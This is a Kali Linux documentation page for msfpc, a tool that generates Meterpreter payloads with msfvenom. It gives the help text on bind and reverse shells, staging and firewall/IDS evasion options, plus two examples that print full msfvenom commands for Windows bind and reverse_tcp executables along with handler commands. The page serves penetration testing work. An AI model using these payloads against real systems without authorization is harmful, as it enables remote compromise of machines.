---
Title: msfpc
Homepage: https://github.com/g0tmi1k/msfpc
Repository: https://gitlab.com/kalilinux/packages/msfpc
Architectures: any
Version: 1.4.5-0kali3
Metapackages: kali-linux-default kali-linux-everything kali-linux-headless kali-linux-large kali-linux-nethunter kali-tools-exploitation kali-tools-social-engineering 
Icon: images/msfpc-logo.svg
PackagesInfo: |
 ### msfpc
 
  A quick way to generate various "basic" Meterpreter payloads using msfvenom
  which is part of the Metasploit framework.
 
 **Installed size:** `58 KB`  
 **How to install:** `sudo apt install msfpc`  
 
 {{< spoiler "Dependencies:" >}}
 * metasploit-framework
 {{< /spoiler >}}
 
 ##### msfpc
 
 
 ```
 root@kali:~# msfpc -h
  [*] MSFvenom Payload Creator (MSFPC v1.4.5)
 
  /usr/bin/msfpc <TYPE> (<DOMAIN/IP>) (<PORT>) (<CMD/MSF>) (<BIND/REVERSE>) (<STAGED/STAGELESS>) (<TCP/HTTP/HTTPS/FIND_PORT>) (<BATCH/LOOP>) (<VERBOSE>)
    Example: /usr/bin/msfpc windows 192.168.1.10        # Windows & manual IP.
             /usr/bin/msfpc elf bind eth0 4444          # Linux, eth0's IP & manual port.
             /usr/bin/msfpc stageless cmd py https      # Python, stageless command prompt.
             /usr/bin/msfpc verbose loop eth1           # A payload for every type, using eth1's IP.
             /usr/bin/msfpc msf batch wan               # All possible Meterpreter payloads, using WAN IP.
             /usr/bin/msfpc help verbose                # Help screen, with even more information.
 
  <TYPE>:
    + APK
    + ASP
    + ASPX
    + Bash [.sh]
    + Java [.jsp]
    + Linux [.elf]
    + OSX [.macho]
    + Perl [.pl]
    + PHP
    + Powershell [.ps1]
    + Python [.py]
    + Tomcat [.war]
    + Windows [.exe // .exe // .dll]
 
  Rather than putting <DOMAIN/IP>, you can do a interface and MSFPC will detect that IP address.
  Missing <DOMAIN/IP> will default to the IP menu.
 
  Missing <PORT> will default to 443.
 
  <CMD> is a standard/native command prompt/terminal to interactive with.
  <MSF> is a custom cross platform shell, gaining the full power of Metasploit.
  Missing <CMD/MSF> will default to <MSF> where possible.
 
  <BIND> opens a port on the target side, and the attacker connects to them. Commonly blocked with ingress firewalls rules on the target.
  <REVERSE> makes the target connect back to the attacker. The attacker needs an open port. Blocked with engress firewalls rules on the target.
  Missing <BIND/REVERSE> will default to <REVERSE>.
 
  <STAGED> splits the payload into parts, making it smaller but dependent on Metasploit.
  <STAGELESS> is the complete standalone payload. More 'stable' than <STAGED>.
  Missing <STAGED/STAGELESS> will default to <STAGED> where possible.
 
  <TCP> is the standard method to connecting back. This is the most compatible with TYPES as its RAW. Can be easily detected on IDSs.
  <HTTP> makes the communication appear to be HTTP traffic (unencrypted). Helpful for packet inspection, which limit port access on protocol - e.g. TCP 80.
  <HTTPS> makes the communication appear to be (encrypted) HTTP traffic using as SSL. Helpful for packet inspection, which limit port access on protocol - e.g. TCP 443.
  <FIND_PORT> will attempt every port on the target machine, to find a way out. Useful with stick ingress/engress firewall rules. Will switch to 'allports' based on <TYPE>.
  Missing <TCP/HTTP/HTTPS/FIND_PORT> will default to <TCP>.
 
  <BATCH> will generate as many combinations as possible: <TYPE>, <CMD + MSF>, <BIND + REVERSE>, <STAGED + STAGELESS> & <TCP + HTTP + HTTPS + FIND_PORT> 
  <LOOP> will just create one of each <TYPE>.
 
  <VERBOSE> will display more information.
 ```
 
 - - -
 
---
{{% hidden-comment "<!--Do not edit anything above this line-->" %}}

## msfpc Usage Examples

Semi-interactively create a Windows Meterpreter bind shell on port 5555.

```
root@kali:~# msfpc windows bind 5555 verbose
 [*] MSFvenom Payload Creator (MSFPC v1.4.4)

 [i] Use which interface - IP address?:
 [i]   1.) lo - 127.0.0.1
 [i]   2.) eth0 - 172.16.193.160
 [i]   3.) wan - 68.151.240.61
 [?] Select 1-3, interface or IP address: 2

 [i]        IP: 172.16.193.160
 [i]      PORT: 5555
 [i]      TYPE: windows (windows/meterpreter/bind_tcp)
 [i]     SHELL: meterpreter
 [i] DIRECTION: bind
 [i]     STAGE: staged
 [i]    METHOD: tcp
 [i]       CMD: msfvenom -p windows/meterpreter/bind_tcp -f exe \
  --platform windows -a x86 -e generic/none  LPORT=5555 \
  > '/root/windows-meterpreter-staged-bind-tcp-5555.exe'

 [i] windows meterpreter created: '/root/windows-meterpreter-staged-bind-tcp-5555.exe'

 [i] File: PE32 executable (GUI) Intel 80386, for MS Windows
 [i] Size: 76K
 [i]  MD5: 5bdb434e053fa0a9894eb88720c09e2a
 [i] SHA1: 9d51c45c76dfd947994cb4be61f5f9797b35167f

 [i] MSF handler file: '/root/windows-meterpreter-staged-bind-tcp-5555-exe.rc'
 [i] Run: msfconsole -q -r '/root/windows-meterpreter-staged-bind-tcp-5555-exe.rc'
 [?] Quick web server (for file transfer)?: python2 -m SimpleHTTPServer 8080
 [*] Done!
 ```


Automatically generate a Windows reverse Meterpreter payload, using the IP address of the eth0 interface as the LHOST parameter.

```
root@kali:~# msfpc windows eth0
 [*] MSFvenom Payload Creator (MSFPC v1.4.4)
 [i]   IP: 172.16.193.160
 [i] PORT: 443
 [i] TYPE: windows (windows/meterpreter/reverse_tcp)
 [i]  CMD: msfvenom -p windows/meterpreter/reverse_tcp -f exe \
  --platform windows -a x86 -e generic/none LHOST=172.16.193.160 LPORT=443 \
  > '/root/windows-meterpreter-staged-reverse-tcp-443.exe'

 [i] windows meterpreter created: '/root/windows-meterpreter-staged-reverse-tcp-443.exe'

 [i] MSF handler file: '/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc'
 [i] Run: msfconsole -q -r '/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc'
 [?] Quick web server (for file transfer)?: python2 -m SimpleHTTPServer 8080
 [*] Done!
```
